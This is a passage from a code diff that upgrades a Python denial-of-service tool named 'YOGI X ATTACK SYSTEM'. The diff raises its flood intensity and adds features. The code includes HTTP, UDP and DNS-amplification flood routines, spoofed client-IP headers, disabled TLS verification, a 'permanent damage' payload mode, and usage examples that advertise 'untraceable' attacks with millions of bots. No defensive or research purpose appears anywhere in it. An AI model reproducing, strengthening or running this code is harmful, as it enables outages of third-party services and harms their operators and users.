-{Color.BOLD}💻 CPU: {Color.CYAN}{self.cpu_usage}%{Color.END} | 🧠 RAM: {Color.CYAN}{self.ram_usage}%{Color.END} | 💀 Damage: {Color.RED}{self.target_damage:.1f}%{Color.END}
+{Color.BOLD}🧵 Threads: {Color.CYAN}{self.active_threads:,}{Color.END} | 🔗 Connections: {Color.CYAN}{self.active_connections:,}{Color.END} | 🎯 Status: {status_color}{self.target_status}{Color.END}
+{Color.BOLD}💻 CPU: {self.get_color_cpu_ram(self.cpu_usage)}{self.cpu_usage}%{Color.END} | 🧠 RAM: {self.get_color_cpu_ram(self.ram_usage)}{self.ram_usage}%{Color.END} | 💀 Damage: {Color.RED}{self.target_damage:.1f}%{Color.END}
 {Color.BOLD}{Color.RED}{damage_bar}{Color.END}
 """
         return stats
+
+    def get_color_cpu_ram(self, value):
+        if value < 70:
+            return Color.GREEN
+        elif value < 90:
+            return Color.YELLOW
+        else:
+            return Color.RED
 
 # ==================== ALL-LAYER DESTRUCTION ENGINE ====================
 class GhostAttackEngine:
@@ -874,7 +1073,7 @@ class GhostAttackEngine:
         
         try:
             # Use multiple DNS resolvers
-            resolvers = ['8.8.8.8', '1.1.1.1', '9.9.9.9']
+            resolvers = ['8.8.8.8', '1.1.1.1', '9.9.9.9', '208.67.222.222']
             resolver = dns.resolver.Resolver()
             resolver.nameservers = resolvers
             answer = resolver.resolve(self.target, 'A')
@@ -901,11 +1100,16 @@ class GhostAttackEngine:
             ttl = random.choice([64, 65, 128, 255])
             sock.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, ttl)
             
+            # Increase buffer sizes
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8192)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 8192)
+            
             if self.use_ssl:
                 context = ssl.create_default_context()
                 context.check_hostname = False
                 context.verify_mode = ssl.CERT_NONE
                 context.set_ciphers('ALL:@SECLEVEL=0')
+                context.set_ecdh_curve('prime256v1')
                 sock = context.wrap_socket(sock, server_hostname=self.target)
             
             return sock
@@ -929,8 +1133,13 @@ class GhostAttackEngine:
             try:
                 sock.connect((self.target_ip, self.port))
                 success = True
+                conn_info = {
+                    'ip': sock.getsockname()[0],
+                    'port': sock.getsockname()[1],
+                    'target': self.target
+                }
+                self.stats.update(0, 0, 0, True, 0, conn_info)
             except Exception as e:
-                # print(f"{Color.RED}[-] Connection failed: {str(e)}{Color.END}")
                 return 0, 0, 0, False, 0
             
             # Number of requests per connection
@@ -938,8 +1147,8 @@ class GhostAttackEngine:
             
             for _ in range(req_count):
                 # Build HTTP request
-                method = random.choice(["GET", "POST"])
-                path = '/' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(5,12)))
+                method = random.choice(["GET", "POST", "PUT", "DELETE", "OPTIONS"])
+                path = '/' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(5,32)))
                 
                 headers = [
                     f"{method} {path} HTTP/1.1",
@@ -948,21 +1157,26 @@ class GhostAttackEngine:
                     f"Accept: */*",
                     f"Accept-Language: en-US,en;q=0.9",
                     f"Connection: keep-alive",
-                    f"Cache-Control: no-cache",
+                    f"Cache-Control: no-cache, no-store, must-revalidate",
+                    f"Pragma: no-cache",
                     f"X-Forwarded-For: {self.spoofer.generate_ghost_ip()}",
                     f"X-Real-IP: {self.spoofer.generate_ghost_ip()}",
+                    f"X-Requested-With: XMLHttpRequest",
                     f"Referer: {self.evasion.get_referer()}",
                     f"Cookie: {self.evasion.get_cookie()}",
                     f"Upgrade-Insecure-Requests: 1",
+                    f"Sec-Fetch-Dest: document",
+                    f"Sec-Fetch-Mode: navigate",
+                    f"Sec-Fetch-Site: same-origin",
                     f"\r\n"
                 ]
                 
-                # For POST requests
-                if method == "POST":
-                    data = f"data={os.urandom(128).hex()}"
+                # For POST/PUT requests
+                if method in ["POST", "PUT"]:
+                    data = f"data={os.urandom(512).hex()}"
                     content_header = f"Content-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(data)}"
-                    headers.insert(-1, content_header)
-                    full_payload = "\r\n".join(headers) + data
+                    headers.insert(-2, content_header)
+                    full_payload = "\r\n".join(headers[:-1]) + data
                 else:
                     full_payload = "\r\n".join(headers)
                 
@@ -973,29 +1187,33 @@ class GhostAttackEngine:
                     requests_sent += 1
                     success = True
                     
+                    # Read response to keep connection alive
+                    try:
+                        sock.recv(1024)
+                    except:
+                        pass
+                    
                     # Small delay between requests
-                    time.sleep(0.01)
+                    time.sleep(0.001)
                     
                 except Exception as e:
-                    # print(f"{Color.YELLOW}[-] Request failed: {str(e)}{Color.END}")
                     break
                 
                 # Additional payload in permanent mode
-                if self.permanent_mode and random.random() > 0.7:
+                if self.permanent_mode and random.random() > 0.5:
                     payload = self.evasion.get_malicious_payload()
                     try:
-                        sock.sendall(payload[:1024].encode())
-                        bytes_sent += 1024
-                        damage += 0.1
+                        sock.sendall(payload[:2048].encode())
+                        bytes_sent += 2048
+                        damage += 0.2
                     except Exception as e:
-                        # print(f"{Color.YELLOW}[-] Malicious payload failed: {str(e)}{Color.END}")
                         break
         except Exception as e:
-            # print(f"{Color.RED}[-] HTTP flood error: {str(e)}{Color.END}")
             pass
         finally:
             try:
                 if sock:
+                    self.stats.remove_connection(conn_info)
                     sock.close()
             except:
                 pass
@@ -1012,14 +1230,14 @@ class GhostAttackEngine:
         try:
             # Create UDP socket
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            sock.settimeout(0.5)
+            sock.settimeout(0.1)
             
             # Generate random payload
-            payload_size = random.randint(1024, 2048)  # 1-2KB per packet
+            payload_size = random.randint(1024, 4096)  # 1-4KB per packet
             payload = os.urandom(payload_size)
             
             # Send multiple packets per connection
-            for _ in range(100):  # 100 packets per socket
+            for _ in range(500):  # 500 packets per socket
                 try:
                     sock.sendto(payload, (self.target_ip, self.port))
                     packets_sent += 1
@@ -1034,7 +1252,6 @@ class GhostAttackEngine:
                     break
                     
         except Exception as e:
-            # print(f"{Color.RED}[-] UDP flood error: {str(e)}{Color.END}")
             pass
         finally:
             try:
@@ -1056,20 +1273,22 @@ class GhostAttackEngine:
                 '8.8.8.8', '8.8.4.4',  # Google
                 '1.1.1.1', '1.0.0.1',  # Cloudflare
                 '9.9.9.9', '149.112.112.112',  # Quad9
+                '64.6.64.6', '64.6.65.6',  # Verisign
             ]
             
             # Create large DNS query (ANY record)
             domain = self.target
             query = dns.message.make_query(domain, dns.rdatatype.ANY)
+            query.flags |= dns.flags.RD  # Recursion desired
             dns_data = query.to_wire()
             
             # Send packets
-            for _ in range(50):  # Reduce packet count
+            for _ in range(100):  # Increased packet count
                 dns_server = random.choice(dns_servers)
                 
                 # Build UDP socket
                 with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
-                    sock.settimeout(0.5)
+                    sock.settimeout(0.1)
                     
                     # Send to DNS server
                     try:
@@ -1078,14 +1297,12 @@ class GhostAttackEngine:
                         bytes_sent += len(dns_data)
                         success = True
                     except Exception as e:
-                        # print(f"{Color.YELLOW}[-] DNS packet failed: {str(e)}{Color.END}")
                         continue
             
         except Exception as e:
-            # print(f"{Color.RED}[-] DNS amplification failed: {str(e)}{Color.END}")
             pass
         
-        return 0, packets_sent, bytes_sent, success, 0.2
+        return 0, packets_sent, bytes_sent, success, 0.5
 
     def execute_attack(self):
         """Execute attack based on type"""
@@ -1099,7 +1316,6 @@ class GhostAttackEngine:
             else:
                 return self.http_flood()
         except Exception as e:
-            # print(f"{Color.RED}[-] Attack execution failed: {str(e)}{Color.END}")
             return 0, 0, 0, False, 0
 
 # ==================== YOGI X CONTROLLER ====================
@@ -1120,7 +1336,7 @@ class GhostController:
         self.dns_amplify = dns_amplify
         self.slow_post = slow_post
         self.ghost_mode = ghost_mode
-        self.stats = GhostStats()
+        self.stats = GhostStats(random.choice(target_list), port, attack_type, duration)
         self.running = True
         self.executor = None
         self.stats.current_method = attack_type
@@ -1142,7 +1358,7 @@ class GhostController:
                     resolved.append(target)
                 else:
                     # Use multiple DNS resolvers
-                    resolvers = ['8.8.8.8', '1.1.1.1', '9.9.9.9']
+                    resolvers = ['8.8.8.8', '1.1.1.1', '9.9.9.9', '208.67.222.222']
                     resolver = dns.resolver.Resolver()
                     resolver.nameservers = resolvers
                     answer = resolver.resolve(target, 'A')
@@ -1176,12 +1392,19 @@ class GhostController:
         stats_thread = threading.Thread(target=self.display_stats, daemon=True)
         stats_thread.start()
         
+        # Start curses display if available
+        if sys.stdout.isatty():
+            try:
+                curses.wrapper(self.curses_display)
+            except:
+                pass
+        
         try:
             while time.time() - start_time < self.duration and self.running:
                 futures = []
                 
                 # Create attack engines for this batch
-                batch_size = min(500, self.bot_count // 10)
+                batch_size = min(1000, self.bot_count // 5)
                 for _ in range(batch_size):
                     target = random.choice(self.resolved_targets)
                     engine = GhostAttackEngine(
@@ -1199,51 +1422,62 @@ class GhostController:
                         self.stats.ghost_ips_generated += requests
                     except Exception as e:
                         self.stats.errors += 1
-                        # print(f"{Color.YELLOW}[-] Attack thread error: {str(e)}{Color.END}")
                 
                 # Update stats
                 self.stats.active_threads = threading.active_count()
                 
                 # Check target status periodically
-                if time.time() - last_status_check > 10:
+                if time.time() - last_status_check > 5:
                     self.check_target_status()
                     last_status_check = time.time()
                 
                 # Adaptive throttling
-                time.sleep(0.1)
+                time.sleep(0.01)
                 
         except KeyboardInterrupt:
             print(f"{Color.YELLOW}[!] Stopping attack...{Color.END}")
             self.running = False
         except Exception as e:
             print(f"{Color.RED}[-] Critical error: {str(e)}{Color.END}")
+            traceback.print_exc()
         
         # Cleanup
         self.stop_attack()
 
     def display_stats(self):
         """Display real-time attack statistics"""
+        last_update = time.time()
         while self.running:
-            os.system('clear' if os.name == 'posix' else 'cls')
-            print(self.stats.formatted_stats())
-            time.sleep(0.5)
+            if time.time() - last_update > 0.5:
+                os.system('clear' if os.name == 'posix' else 'cls')
+                print(self.stats.formatted_stats())
+                last_update = time.time()
+            time.sleep(0.1)
+
+    def curses_display(self, stdscr):
+        """Curses-based real-time display"""
+        display = GhostStatsDisplay(stdscr, self.stats)
+        display.display()
 
     def check_target_status(self):
         """Check if target is still responding"""
         try:
             target = random.choice(self.resolved_targets)
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(2)
+            sock.settimeout(1)
             result = sock.connect_ex((target, self.port))
-            self.stats.target_status = "DOWN" if result != 0 else "UP"
+            if result == 0:
+                self.stats.target_status = "UP"
+            else:
+                self.stats.target_status = "DOWN"
             sock.close()
         except Exception as e:
-            # print(f"{Color.YELLOW}[-] Status check failed: {str(e)}{Color.END}")
             self.stats.target_status = "UNKNOWN"
 
     def stop_attack(self):
         """Stop attack and clean up resources"""
         self.running = False
+        self.stats.running = False
         if self.executor:
             self.executor.shutdown(wait=False)
         print(f"{Color.GREEN}[+] Attack completed!{Color.END}")
@@ -1261,7 +1495,7 @@ def show_help_menu():
     print(f"  {Color.WHITE}-p, --port{Color.END}          Target port (1-65535)")
     print(f"  {Color.WHITE}-a, --attack{Color.END}        Attack type: {Color.GREEN}QUANTUM{Color.END} (Bypass), {Color.RED}ARMAGEDDON{Color.END} (Destruction), {Color.RED}APOCALYPSE{Color.END} (Brutal), {Color.PINK}GHOST{Color.END} (Untraceable)")
     print(f"  {Color.WHITE}-d, --duration{Color.END}      Attack duration in seconds (default: 300)")
-    print(f"  {Color.WHITE}-b, --bots{Color.END}          Number of bots (50000-20000000)")
+    print(f"  {Color.WHITE}-b, --bots{Color.END}          Number of bots (50000-50000000)")
     
     print(f"\n{Color.BOLD}{Color.CYAN}ADVANCED PARAMETERS:{Color.END}")
     print(f"  {Color.WHITE}--ssl{Color.END}               Use SSL/TLS connection")
@@ -1291,24 +1525,24 @@ def show_examples():
     print(f"\n{Color.BOLD}{Color.PURPLE}{' YOGI X ATTACK SYSTEM - USAGE EXAMPLES '.center(120, '=')}{Color.END}")
     
     print(f"\n{Color.BOLD}{Color.CYAN}BASIC EXAMPLES:{Color.END}")
-    print(f"  {Color.WHITE}./yogi_x_attack.py -t target.com -p 80 -a QUANTUM -b 50000{Color.END}")
-    print(f"     {Color.YELLOW}→ Basic bypass attack on target.com port 80 with 50,000 bots")
+    print(f"  {Color.WHITE}./yogi_x_attack.py -t target.com -p 80 -a QUANTUM -b 100000{Color.END}")
+    print(f"     {Color.YELLOW}→ Basic bypass attack on target.com port 80 with 100,000 bots")
     
     print(f"\n{Color.BOLD}{Color.CYAN}UNTRACEABLE ATTACK:{Color.END}")
-    print(f"  {Color.WHITE}sudo ./yogi_x_attack.py -t target.com -p 443 -a GHOST --ssl --ghost-mode -b 100000{Color.END}")
-    print(f"     {Color.YELLOW}→ Untraceable attack with SSL on port 443, 100,000 bots (requires root)")
+    print(f"  {Color.WHITE}sudo ./yogi_x_attack.py -t target.com -p 443 -a GHOST --ssl --ghost-mode -b 500000{Color.END}")
+    print(f"     {Color.YELLOW}→ Untraceable attack with SSL on port 443, 500,000 bots (requires root)")
     
     print(f"\n{Color.BOLD}{Color.CYAN}MULTI-TARGET ATTACK:{Color.END}")
-    print(f"  {Color.WHITE}./yogi_x_attack.py -T targets.txt -p 80 -a QUANTUM -b 200000{Color.END}")
-    print(f"     {Color.YELLOW}→ Bypass attack on all targets in targets.txt, 200,000 bots")
+    print(f"  {Color.WHITE}./yogi_x_attack.py -T targets.txt -p 80 -a QUANTUM -b 1000000{Color.END}")
+    print(f"     {Color.YELLOW}→ Bypass attack on all targets in targets.txt, 1 million bots")
     
     print(f"\n{Color.BOLD}{Color.CYAN}PERMANENT DAMAGE MODE:{Color.END}")
-    print(f"  {Color.WHITE}sudo ./yogi_x_attack.py -t target.com -p 80 -a ARMAGEDDON --permanent -b 1000000{Color.END}")
-    print(f"     {Color.YELLOW}→ Permanent damage attack, 1 million bots (requires root)")
+    print(f"  {Color.WHITE}sudo ./yogi_x_attack.py -t target.com -p 80 -a ARMAGEDDON --permanent -b 5000000{Color.END}")
+    print(f"     {Color.YELLOW}→ Permanent damage attack, 5 million bots (requires root)")
     
     print(f"\n{Color.BOLD}{Color.CYAN}COMBINED ATTACK:{Color.END}")
-    print(f"  {Color.WHITE}sudo ./yogi_x_attack.py -t target.com -p 443 -a GHOST --ssl --cf-bypass --dns-amplify --ghost-mode -b 2000000{Color.END}")
-    print(f"     {Color.YELLOW}→ Untraceable attack with all techniques, 2 million bots")
+    print(f"  {Color.WHITE}sudo ./yogi_x_attack.py -t target.com -p 443 -a GHOST --ssl --cf-bypass --dns-amplify --ghost-mode -b 10000000{Color.END}")
+    print(f"     {Color.YELLOW}→ Untraceable attack with all techniques, 10 million bots")
     
     print(f"\n{Color.BOLD}{Color.PURPLE}{'='*120}{Color.END}")
 
@@ -1355,7 +1589,7 @@ def main():
         show_examples()
         return
     elif args.version:
-        print(f"{Color.BOLD}{Color.PURPLE}YOGI X ATTACK SYSTEM - Project Armageddon Pro Max Ultra+ (True Ghost Edition) v2.1{Color.END}")
+        print(f"{Color.BOLD}{Color.PURPLE}YOGI X ATTACK SYSTEM - Project Armageddon Pro Max Ultra+ (True Ghost Edition) v3.0{Color.END}")
         return
     
     # Validate required parameters
@@ -1437,15 +1671,16 @@ def main():
             cf_bypass=args.cf_bypass,
             hyper_mode=args.hyper,
             permanent_mode=args.permanent,
-            http2_mode=False,   # karena tidak ada argumennya, kita set False
+            http2_mode=False,
             dns_amplify=args.dns_amplify,
-            slow_post=False,    # karena tidak ada argumennya, kita set False
+            slow_post=False,
             ghost_mode=args.ghost_mode
         )
         
         controller.start_attack()
     except Exception as e:
         print(f"{Color.RED}[-] Critical error: {str(e)}{Color.END}")
+        traceback.print_exc()
 
 if __name__ == "__main__":
     main()
